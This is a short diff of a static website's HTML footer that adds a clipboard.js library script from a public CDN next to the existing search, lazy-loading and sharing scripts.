 <h3 id="useful-resources-">Useful Resources :</h3>
 <ul>
@@ -898,5 +927,5 @@ C:\Program Files\example 2\app.exe</code></pre></div>
         <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
 </html>
